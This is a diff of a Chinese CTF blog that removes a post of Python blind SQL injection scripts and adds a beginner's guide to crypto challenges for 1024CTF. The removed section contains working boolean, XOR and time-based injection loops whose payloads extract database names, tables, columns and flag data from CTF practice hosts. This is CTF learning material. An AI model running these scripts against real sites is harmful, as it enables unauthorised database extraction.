@@ -6,20 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>ctfweb-各种盲注脚本 | FanqieのBlog</title>
+  <title>CRYPTO——密码的取经之路 | FanqieのBlog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼 核心算法都是二分法，不推荐时间盲注（速度硬伤） 脚本payload参考题目：[第一章 web入门]SQL注入-2  &#x2F; 极客大挑战finilysql（buuctf）">
+  <meta name="description" content="just an introduction for 1024CTF to beginner, I’m also an amateur">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfweb-各种盲注脚本">
-<meta property="og:url" content="http://example.com/2021/08/17/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/index.html">
+<meta property="og:title" content="CRYPTO——密码的取经之路">
+<meta property="og:url" content="http://example.com/2021/10/23/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/index.html">
 <meta property="og:site_name" content="FanqieのBlog">
-<meta property="og:description" content="以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼 核心算法都是二分法，不推荐时间盲注（速度硬伤） 脚本payload参考题目：[第一章 web入门]SQL注入-2  &#x2F; 极客大挑战finilysql（buuctf）">
+<meta property="og:description" content="just an introduction for 1024CTF to beginner, I’m also an amateur">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-08-17T13:51:59.954Z">
-<meta property="article:modified_time" content="2021-08-17T13:51:59.955Z">
+<meta property="og:image" content="http://example.com/C:/Users/高萌/Desktop/二维码.jpg">
+<meta property="article:published_time" content="2021-10-23T02:44:00.030Z">
+<meta property="article:modified_time" content="2021-10-23T02:58:38.343Z">
 <meta property="article:author" content="gaomeng">
-<meta property="article:tag" content="sql">
+<meta property="article:tag" content="业余爱好">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/C:/Users/高萌/Desktop/二维码.jpg">
   
     <link rel="alternative" href="/atom.xml" title="FanqieのBlog" type="application/atom+xml">
   
@@ -167,50 +169,104 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-ctfweb-各种盲注脚本" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-CRYPTO——密码的取经之路" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ctfweb-各种盲注脚本
+      CRYPTO——密码的取经之路
     </h1>
   
 
         
-        <a href="/2021/08/17/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="archive-article-date">
-  	<time datetime="2021-08-17T13:51:59.954Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-17</time>
+        <a href="/2021/10/23/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/" class="archive-article-date">
+  	<time datetime="2021-10-23T02:44:00.030Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-23</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼</p>
-<p>核心算法都是<strong>二分法</strong>，不推荐时间盲注（速度硬伤）</p>
-<p>脚本payload参考题目：[第一章 web入门]SQL注入-2  / 极客大挑战finilysql（buuctf）</p>
+        <p>just an introduction for 1024CTF to beginner, I’m also an amateur</p>
 <span id="more"></span>
 
-<h1 id="1-通过post传参的脚本"><a href="#1-通过post传参的脚本" class="headerlink" title="1.通过post传参的脚本"></a>1.通过post传参的脚本</h1><hr>
-<p>用的时候修改post参数和个数</p>
-<h2 id="1-1-基于异或盲注，布尔盲注等："><a href="#1-1-基于异或盲注，布尔盲注等：" class="headerlink" title="1.1 基于异或盲注，布尔盲注等："></a>1.1 基于<strong>异或盲注</strong>，<strong>布尔盲注</strong>等：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; or ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot;    #查库</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;note&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot;   #查表</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;fl4g&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;#&quot;   #查列</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; or ascii(substr((seleCt(flag)from(fl4g)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span>   <span class="comment">#查数据</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:<span class="string">&#x27;qwer&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;u6216&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span>       </span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span> :</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(low))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-2-基于时间盲注："><a href="#1-2-基于时间盲注：" class="headerlink" title="1.2 基于时间盲注："></a>1.2 基于<strong>时间盲注</strong>：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)#&quot;       #查库名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;or if(ascii(substr((seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;note&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)#&quot;        #查表名</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;or if(ascii(substr((seleCt(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),1)#&quot;        #查列名</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;or if(ascii(substr((seleCt(flag)from(fl4g)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),1)#&quot;</span>       <span class="comment">#查数据</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;pass&quot;</span>:<span class="string">&#x27;qwer&#x27;</span></span><br><span class="line">        &#125;        </span><br><span class="line">        last = <span class="built_in">int</span>(time.time())</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        now = <span class="built_in">int</span>(time.time())</span><br><span class="line">        <span class="keyword">if</span> now - last &gt; <span class="number">1</span> :    </span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span> </span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span> :</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(low))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-通过get传参的脚本"><a href="#2-通过get传参的脚本" class="headerlink" title="2.通过get传参的脚本"></a>2.通过get传参的脚本</h1><hr>
-<p>修改url 和 文本</p>
-<h2 id="2-1-基于异或盲注，布尔盲注等："><a href="#2-1-基于异或盲注，布尔盲注等：" class="headerlink" title="2.1 基于异或盲注，布尔盲注等："></a>2.1 基于异或盲注，布尔盲注等：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&quot;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">        payload=<span class="string">f&quot;1^(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span>       <span class="comment">#查库名</span></span><br><span class="line">        <span class="comment">#payload=f&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;        #查表名</span></span><br><span class="line">        <span class="comment">#payload=f&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;      #查列名</span></span><br><span class="line">        <span class="comment">#payload=f&quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)#&quot;       #查数据</span></span><br><span class="line">        response=requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">min</span> != <span class="number">32</span> :</span><br><span class="line">        name += <span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-基于时间盲注："><a href="#2-2-基于时间盲注：" class="headerlink" title="2.2 基于时间盲注："></a>2.2 基于时间盲注：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=&quot;</span></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">        payload=<span class="string">f&quot; &quot;</span>       <span class="comment">#查库名</span></span><br><span class="line">        <span class="comment">#payload=f&quot; &quot;        #查表名</span></span><br><span class="line">        <span class="comment">#payload=f&quot; &quot;      #查列名</span></span><br><span class="line">        <span class="comment">#payload=f&quot; &quot;       #查数据</span></span><br><span class="line">        last = <span class="built_in">int</span>(time.time())</span><br><span class="line">        response=requests.get(url=url+payload)</span><br><span class="line">        now = <span class="built_in">int</span>(time.time())</span><br><span class="line">        <span class="keyword">if</span> now - last &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">min</span> != <span class="number">32</span> :</span><br><span class="line">        name += <span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="3-备注"><a href="#3-备注" class="headerlink" title="3.备注"></a>3.备注</h1><p>1.payload不放了，这个做题慢慢积累，网上也都有，根据题目自己写</p>
-<p>2.能不使用sleep就不使用，速度比其他的方法慢太多</p>
-<p>3.在网不好的情况下可能会出现脚本打印的字符错误，不是代码问题</p>
-<p>4.自己写的脚本可能不完善，有问题或者有建议留言，有需求也可以自改</p>
-<p>5.遇到新的脚本或者方法再补充</p>
 <hr>
-<p>END</p>
+<p><em><strong>welcome to 1024CTF !</strong></em></p>
+<p>这是一篇帮助你干掉密码的攻略，仔细阅读喔~</p>
+<hr>
+<h2 id="为什么写这篇文章：Why"><a href="#为什么写这篇文章：Why" class="headerlink" title="为什么写这篇文章：Why"></a>为什么写这篇文章：Why</h2><p>答：因为题出的有点有点难，密码题一般解题情况不是很乐观，因为大多依靠经验和网络。</p>
+<p>所以写这篇指南做一下简单介绍，帮你们排一下雷，快速入门</p>
+<blockquote>
+<p><del>ps：如果你对密码和其他方向都感兴趣，可以像我一样主攻其他的顺便搞一搞密码和杂项</del></p>
+<p>​        战队缺密码手</p>
+</blockquote>
+<hr>
+<h2 id="什么是密码学：What"><a href="#什么是密码学：What" class="headerlink" title="什么是密码学：What"></a><strong>什么是密码学：What</strong></h2><blockquote>
+<p><strong>顾名思义就是研究加密的学科。</strong>现代密码学要求在加密算法公开的情况下，只要不知道密钥，就无法对消息进行解密。这样的话，仅需要保护一个不算长的密钥即可保护一段信息；即使密钥泄露，换个密钥就能继续用同一个加密算法加密。所以，密码学就是要寻找一个在不知道密钥情况下无法破解的算法。</p>
+</blockquote>
+<p>在CTF比赛中，密码学有难有易，简单题甚至不需要过脑子就可以解密出来，而往往重要比赛中，解密需要脚本的支持与配合，这就要求解题人掌握熟练地编程能力，灵活的思维和丰富的经验。相对而言密码学是一个比较容易入手的方向，只是需要时间的积淀，你也可以成为一名合格的密码手，并且逐渐享受密码学带给你的乐趣。</p>
+<hr>
+<h2 id="学习密码学需要什么基础：Basis"><a href="#学习密码学需要什么基础：Basis" class="headerlink" title="学习密码学需要什么基础：Basis"></a><strong>学习密码学需要什么基础：Basis</strong></h2><blockquote>
+<p><strong>数学基础</strong>： 密码学是数学的一个应用学科，最早的公钥密码算法RSA就是基于数论的，因此学习密码学通常还需要从数论开始学起。其次，最早不是基于数学的块密码，在发展的过程中，也被运用数学的语言来描述，从而更能够更清晰的找到攻击方法。因此，学习密码学会涉及到大量的数学知识，欢迎对数学感兴趣（至少不讨厌）的同学来钻研学习</p>
+</blockquote>
+<blockquote>
+<p><strong>编程基础</strong>： 现代密码学比古典密码复杂许多，它的加密解密算法不是人能够口算或者笔算出来的东西，因此也需要编程。而密码学由于经常要用到特别大的数字，远超c和c++的long long int的上限，因此一般使用python编写程序。python是一个较接近自然语言的编程语言，因此容易上手，灵活运用搜索引擎以及网上一些教程很容易学会。</p>
+</blockquote>
+<blockquote>
+<p><strong>英语基础</strong>： 你有可能会遇到一些需要阅读纯英文文章才能解决的题目，需要有一定的耐心才能看明白。</p>
+</blockquote>
+<p>害，不要被这些条件吓走，毕竟这是<strong>大佬水准</strong>，而我只是一名web来兼任的密码的菜鸡，教不了你们这些…</p>
+<p>对于我们这种小白，或者是想在其他方向瓶颈时研究一下密码学，其实都不是很难，只需要从基础密码抓起，慢慢培养兴趣，逐渐就会有所收获，成为密码大佬！</p>
+<hr>
+<h2 id="常见密码分类：Classify"><a href="#常见密码分类：Classify" class="headerlink" title="常见密码分类：Classify"></a><strong>常见密码分类：Classify</strong></h2><p>由于这是一篇赛前指南，我就不在此对密码详细介绍了，只做一下<strong>基本密码的分类</strong>，详细的问题还要自己努力呀</p>
+<p>（请仔细阅读，部分题型就在这里）</p>
+<p><em><strong>新手常见密码分类：</strong></em></p>
+<ul>
+<li><p>基本古典密码：栅栏密码、埃特巴什码、凯撒密码、猪圈密码、Keyboard密码、标准银河字母密码、圣堂武士密码、维吉尼亚密码</p>
+</li>
+<li><p>基本编码类密码：ASCII编码、Base64/32/16编码、莫尔斯电码、UUencode编码、URL编码、Unicode编码、敲击码、MD5</p>
+</li>
+<li><p>花里胡哨可能出现但用处不多的密码：php混淆加密、JSfuck、aaencode、brainfuck、ook编码、emo密码、base全家桶系列</p>
+</li>
+<li><p>其他可能出现的简单密码：ROT系列、佛语论禅及其变形、价值观、猪圈及其变形等等（各种奇怪的我一时也想不起来）</p>
+</li>
+<li><p>简单脚本类：常见的RSA求解、常见的编码转换求解、自加密算法脚本求解等</p>
+<hr>
+</li>
+</ul>
+<h2 id="密码学工具及准备：Tools-amp-Pre"><a href="#密码学工具及准备：Tools-amp-Pre" class="headerlink" title="密码学工具及准备：Tools&amp;Pre"></a><strong>密码学工具及准备：Tools</strong>&amp;Pre</h2><ul>
+<li>python 及其对应的一堆库</li>
+<li>一些自己大佬编写的密码工具</li>
+</ul>
+<p>python请自行配置，推荐3.7以上版本，请确保pip正常使用。平时积累的脚本可以收集起来，可能会反复使用</p>
+<p>建议多刷题，在无聊的时间里，养成基本密码一眼看出的水平。</p>
+<p>了解rsa算法，rsa在密码方向占了重要位置</p>
+<p>多收藏大佬的网站和帖子，多找总结帖，说不定就用上了</p>
+<hr>
+<h2 id="做题的基本步骤：Step"><a href="#做题的基本步骤：Step" class="headerlink" title="做题的基本步骤：Step"></a><strong>做题的基本步骤：Step</strong></h2><ul>
+<li>不要慌，先冷静五秒</li>
+<li>看看格式有印象吗</li>
+<li>如果没有就看描述，有就去尝试</li>
+<li>如果还是不知道就用常见的试试，或者找大佬的密码总结帖，看看是否有帮助</li>
+<li>尝试到你不想做了，或者搞到flag</li>
+<li>再不行就看wp写wp吧</li>
+</ul>
+<hr>
+<h2 id="写在最后：Last"><a href="#写在最后：Last" class="headerlink" title="写在最后：Last"></a>写在最后：Last</h2><p>密码能给你在其他方向做到痛不欲生时带来一丝惊喜（上分快），通常密码和杂项配合起来有奇效（上分非常快）</p>
+<p>密码学是信安和网安的必修专业课，学会了你就领先别人一手，一举两得~</p>
+<p>但是学习crypto的人很少，一开始学习密码学必有许多艰难险阻…</p>
+<p>一路下来，会有不少人放弃…</p>
+<p>但是如果你带着<strong>兴趣</strong>，坚持下来，必然会有效果不错的收获！</p>
+<p>再次推一下XJUSEC的公众号</p>
+<p><img src="/C:/Users\高萌\Desktop\二维码.jpg" alt="二维码"></p>
+<p>在比赛的CTFER们，</p>
+<p>加油冲，XJUSEC等你哟~</p>
+<blockquote>
+<p>在经历过风吹雨打之后，当第一缕的阳光投射到你疲劳憔悴的脸庞时，你会感到欣喜若狂。</p>
+</blockquote>
+<p>​                                                                                                                                                                                Written by 一名废物web选手</p>
 
       
 
@@ -255,7 +311,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">业余爱好</a>
         		</li>
       		
 		</ul>
@@ -311,7 +367,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://2740908911.github.io/021/08/17/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://2740908911.github.io/021/10/23/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -325,18 +381,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/08/28/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          xjusec考核赛解题过程
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/08/16/(ctfwp)py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">(ctfwp)py代码审计</div>
+    <a href="/2021/08/28/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">xjusec考核赛解题过程</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -363,7 +410,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%87post%E4%BC%A0%E5%8F%82%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text">1.通过post传参的脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E5%9F%BA%E4%BA%8E%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8%EF%BC%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%AD%89%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 基于异或盲注，布尔盲注等：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 基于时间盲注：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E9%80%9A%E8%BF%87get%E4%BC%A0%E5%8F%82%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">2.通过get传参的脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%9F%BA%E4%BA%8E%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8%EF%BC%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%AD%89%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 基于异或盲注，布尔盲注等：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 基于时间盲注：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%A4%87%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">3.备注</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%9AWhy"><span class="toc-number">1.</span> <span class="toc-text">为什么写这篇文章：Why</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AF%86%E7%A0%81%E5%AD%A6%EF%BC%9AWhat"><span class="toc-number">2.</span> <span class="toc-text">什么是密码学：What</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E5%AF%86%E7%A0%81%E5%AD%A6%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88%E5%9F%BA%E7%A1%80%EF%BC%9ABasis"><span class="toc-number">3.</span> <span class="toc-text">学习密码学需要什么基础：Basis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%88%86%E7%B1%BB%EF%BC%9AClassify"><span class="toc-number">4.</span> <span class="toc-text">常见密码分类：Classify</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%87%86%E5%A4%87%EF%BC%9ATools-amp-Pre"><span class="toc-number">5.</span> <span class="toc-text">密码学工具及准备：Tools&amp;Pre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9AStep"><span class="toc-number">6.</span> <span class="toc-text">做题的基本步骤：Step</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 